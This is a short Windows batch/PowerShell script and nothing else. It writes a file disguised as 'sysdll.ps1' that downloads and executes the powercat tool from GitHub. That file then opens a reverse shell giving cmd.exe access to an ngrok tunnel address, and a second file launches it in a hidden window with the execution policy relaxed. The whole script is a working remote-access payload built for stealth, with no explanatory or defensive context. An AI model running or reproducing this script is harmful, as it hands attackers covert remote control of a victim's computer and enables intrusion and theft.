echo IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1");(powercat -c 0.tcp.ngrok.io -p 12823 -e "C:\Windows\System32\cmd.exe") > C:\users\public\Documents\sysdll.ps1
cd C:\users\public\Documents\
echo start-process PowerShell.exe -arg $pwd\sysdll.ps1 -WindowStyle Hidden > C:\users\public\Documents\sysdll2.ps1
Powershell.exe -executionpolicy remotesigned -File  sysdll2.ps1
